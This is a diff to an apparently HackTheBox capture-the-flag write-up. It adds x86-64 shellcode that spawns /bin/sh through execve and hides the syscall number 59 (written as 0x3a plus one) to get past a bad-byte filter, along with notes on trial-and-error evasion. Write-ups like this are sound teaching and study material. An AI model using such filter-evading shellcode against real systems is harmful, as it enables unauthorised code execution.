@@ -81,4 +81,40 @@ b'/bin/sh\x00'
 
 
 7. Got several bad bytes and it seems filtered for `/bin/sh` strings, NULL byte, and 59 or execve call.
-8. Let's start by manipulate the 59 value. Actually we can just use 0x3a rather than 0x3b then add 1 byte to al.
+8. Let's start by manipulate the 59 value. Actually we can just use 0x3a rather than 0x3b then add 1 byte to al (8 bit).
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/052f7d17-5df6-40d8-bc3e-2dee49ba34c8)
+
+
+> UPDATED SHELLCODE
+
+```
+mov rax, 0x68732f6e69622f
+push rax
+mov rdi, rsp
+xor rsi, rsi
+xor rdx, rdx
+push 0x3a
+pop rax
+add al, 0x1
+syscall
+```
+
+#### NOTES:
+
+```
+To obtain the correct asm instructions is using trial and error. If you pass:
+
+mov rax, 0x3a
+add al, 0x1
+
+It shall bypassed the 59 filter, but introduced another bad bytes.
+```
+
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/abd28ea7-6743-4bba-bfeb-af7a6a769908)
+
+
+9. Great! Now let's try to bypass the NULL byte first.
